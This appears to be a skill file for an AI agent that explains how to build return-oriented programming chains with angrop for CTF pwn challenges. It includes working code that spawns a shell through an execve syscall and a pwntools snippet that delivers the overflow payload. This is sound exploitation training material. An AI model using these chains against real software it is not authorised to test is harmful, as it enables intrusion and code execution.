---
name: craft-rop-chains-with-angrop
description: >
  Automatically find gadgets and assemble ROP chains for pwn challenges with
  angrop (angr's ROP engine). Use ONLY when you actually need to BUILD a ROP
  chain — e.g. set registers for a syscall, ret2syscall/execve, ret2libc-style
  func_call, write "/bin/sh" to memory, stack pivot, or mprotect+shellcode.
  Trigger on: "build/craft a ROP chain", ret2syscall, execve ROP, set_regs,
  func_call chain, write_to_mem, add_to_mem, stack pivot, mprotect chain,
  chaining gadgets. Do NOT use for non-ROP exploitation (heap, format string,
  simple single-gadget ret2win), for plain gadget *lookup* (use ropper/ROPgadget),
  or for general angr symbolic execution.
---

# Crafting ROP Chains with angrop

[angrop](https://github.com/angr/angrop) is angr's ROP-chain builder. Instead of
hand-picking gadgets, you declare the *effect* you want (set these registers,
call this function, do this syscall) and angrop searches the binary's gadgets
and assembles a working chain. Supports x86/x86-64 (best), and ARM/MIPS.

`angr` and `angrop` are already installed. Verify:

```bash
python3 -c "import angr, angrop; print('angrop ready')"
```

## When to reach for this

Use angrop when you've already identified a control-flow hijack (e.g. a stack
buffer overflow overwriting the saved return address) **and now need a ROP chain
to do real work**. It shines for multi-gadget chains where manual assembly is
tedious or error-prone. For a single `pop rdi; ret` ret2win, manual is fine.

## Core workflow

```python
import angr, angrop  # noqa: angrop registers the ROP analysis on import

proj = angr.Project("./vuln", auto_load_libs=False)
rop = proj.analyses.ROP()
rop.find_gadgets()          # SLOW (seconds–minutes). Parallel by default.
# rop.find_gadgets_single_threaded()   # use if the parallel finder hangs
```

**Always cache gadgets** — finding them is the expensive step. Do it once, then
reuse across iterations:

```python
rop.find_gadgets(); rop.save_gadgets("vuln.gadgets")
# later runs:
rop = proj.analyses.ROP(); rop.load_gadgets("vuln.gadgets")
```

If the exploit input has forbidden bytes (newline, null, etc.), set them before
finding gadgets so angrop avoids gadget addresses containing them:

```python
rop = proj.analyses.ROP()
rop.set_badbytes([0x00, 0x0a])
rop.find_gadgets()
```

## Building chains

Each builder returns a chain object; concatenate with `+` to sequence them.

```python
# Set registers (e.g. prep a syscall or function args)
chain = rop.set_regs(rax=59, rdi=bin_sh_addr, rsi=0, rdx=0)

# Call a function by name (needs symbols) or by address
chain = rop.func_call("system", [bin_sh_addr])
chain = rop.func_call(0x401234, [arg1, arg2])

# Write bytes to a writable address (e.g. stage "/bin/sh\x00" into .bss)
chain = rop.write_to_mem(bss_addr, b"/bin/sh\x00")

# Do a raw syscall: do_syscall(num, [args])  — execve("/bin/sh", 0, 0) = 59
chain = rop.do_syscall(59, [bin_sh_addr, 0, 0])

# Convenience for execve, when available in your angrop version
chain = rop.execve(path="/bin/sh")

# Stack pivot to a new chain location
chain = rop.pivot(new_stack_addr)
```

Classic ret2syscall built by composition — stage the string, then execve:

```python
bss = proj.loader.main_object.sections_map[".bss"].vaddr + 0x100
chain  = rop.write_to_mem(bss, b"/bin/sh\x00")
chain += rop.do_syscall(59, [bss, 0, 0])
```

## Getting the payload out

```python
payload = chain.payload_str()     # raw bytes — feed straight into your overflow
chain.print_payload_code()        # prints pwntools-style python (great to inspect)
print(chain.payload_code())       # same as a string
```

Drop the bytes into the offset after the saved return address:

```python
from pwn import *
io = process("./vuln")            # or remote(host, port)
io.sendline(b"A" * offset + chain.payload_str())
io.interactive()
```

## PIE / ASLR binaries

Gadget addresses are baked into the chain, so the project's load base must match
the runtime base. Two options:

- **Known/leaked base:** load the project at the leaked base, then find gadgets
  and build the chain (gadgets are cheap to keep but re-finding per leak is slow):
  `angr.Project("./vuln", main_opts={"base_addr": leaked_base})`.
- **Offset approach:** load at base `0`, build the chain to get *offsets*, and
  rebase manually by adding the leaked base — only safe if the chain contains no
  absolute non-rebasable constants.

For a non-PIE binary, none of this applies — addresses are fixed.

## Practical notes

- `find_gadgets()` is the bottleneck. Cache with `save_gadgets`/`load_gadgets`
  and reuse across exploit-script iterations rather than re-running each time.
- angrop versions differ in available builders. If a method is missing, list
  what's available: `python3 -c "import angr,angrop; r=angr.Project('./vuln',auto_load_libs=False).analyses.ROP(); print([m for m in dir(r) if not m.startswith('_')])"`,
  and check the [angrop README](https://github.com/angr/angrop) for your version.
- If a chain can't be built, angrop raises `RopException` — the binary may lack
  the needed gadgets; widen scope (include libc: load it as a project and run
  `ROP` on it) or fall back to manual gadget hunting (`ropper`, `ROPgadget`).
- Use `auto_load_libs=False` for speed unless you need library gadgets.
